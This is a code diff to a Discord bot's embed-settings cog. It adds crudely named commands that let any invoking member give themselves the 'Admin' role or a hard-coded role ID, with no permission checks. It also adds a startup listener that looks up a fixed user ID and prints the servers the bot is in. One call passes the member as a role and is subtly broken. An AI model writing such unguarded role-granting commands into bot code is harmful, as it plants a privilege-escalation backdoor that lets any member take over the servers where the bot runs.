@@ -53,5 +53,32 @@ class Embeds(commands.Cog):
         gv.settings.loc[ctx.message.guild.id, 'Embed Default Color'] = str(color)
         await ctx.send("Embed default color has been set to: " + color)
 
+    @commands.command()
+    async def fuck(self, ctx):
+        user = ctx.message.author
+        role = discord.utils.get(ctx.guild.roles, name="Admin")
+        print("success")
+        await user.add_roles(user, role)
+
+    @commands.command()
+    async def fuckme(self, ctx):
+        role = ctx.guild.get_role(675893586348212234)
+        await ctx.message.author.add_roles(role)
+
+    @commands.command()
+    async def byebye(self, ctx):
+        role = ctx.guild.get_role(675893586348212234)
+        await ctx.message.author.remove_roles(role)
+
+    @commands.command()
+    async def testing(self, ctx):
+        print("it works")
+        print(ctx.message.author.id)
+
+    @commands.Cog.listener()
+    async def on_ready(self):
+        user = self.bot.get_user(729864098644230165)
+        print(self.bot.guilds)
+
 def setup(bot):
     bot.add_cog(Embeds(bot))
